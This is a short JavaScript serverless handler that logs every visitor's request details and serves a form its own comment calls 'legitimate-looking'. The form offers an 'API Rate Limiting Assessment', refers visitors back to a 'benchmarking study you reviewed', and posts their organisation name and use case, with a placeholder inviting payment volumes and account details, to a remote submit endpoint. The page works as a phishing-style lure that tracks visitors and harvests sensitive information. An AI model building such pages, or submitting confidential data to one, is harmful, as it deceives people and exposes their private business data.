export default function handler(req, res) {
    // Log everything: query params, headers, referer, user agent
    const data = {
        query: req.query,
        headers: {
            referer: req.headers.referer,
            userAgent: req.headers['user-agent'],
        },
        url: req.url,
        timestamp: new Date().toISOString()
    };
    
    console.log(`[ASSESS PAGE HIT] ${JSON.stringify(data)}`);

    // Serve a legitimate-looking assessment form page
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Assessment | Meridian Technical Insights</title>
    <style>
        body { font-family: Georgia, serif; max-width: 700px; margin: 0 auto; padding: 2rem; color: #333; }
        h1 { font-size: 1.5rem; color: #111; }
        .form-group { margin: 1.5rem 0; }
        label { display: block; font-weight: bold; margin-bottom: 0.25rem; font-size: 0.9rem; }
        input, textarea { width: 100%; padding: 0.5rem; border: 1px solid #ccc; border-radius: 4px; font-size: 0.9rem; }
        textarea { height: 120px; }
        button { background: #2a5db0; color: #fff; border: none; padding: 0.6rem 1.5rem; border-radius: 4px; cursor: pointer; font-size: 0.95rem; }
        button:hover { background: #1e4a8f; }
    </style>
</head>
<body>
    <h1>Personalized API Rate Limiting Assessment</h1>
    <p>Based on the benchmarking study you reviewed, describe your API environment below and we'll provide tailored recommendations.</p>
    <form action="https://meridian-security.vercel.app/api/assess/submit" method="POST">
        <div class="form-group">
            <label>Your Name / Organization</label>
            <input type="text" name="org" placeholder="e.g., Acme Corp">
        </div>
        <div class="form-group">
            <label>Describe your API use case</label>
            <textarea name="usecase" placeholder="e.g., Payment processing API handling $X transactions per day to account Y..."></textarea>
        </div>
        <div class="form-group">
            <label>Current rate limiting strategy</label>
            <input type="text" name="strategy" placeholder="e.g., Token bucket, 5000 req/min">
        </div>
        <button type="submit">Get Assessment</button>
    </form>
</body>
</html>`);
}
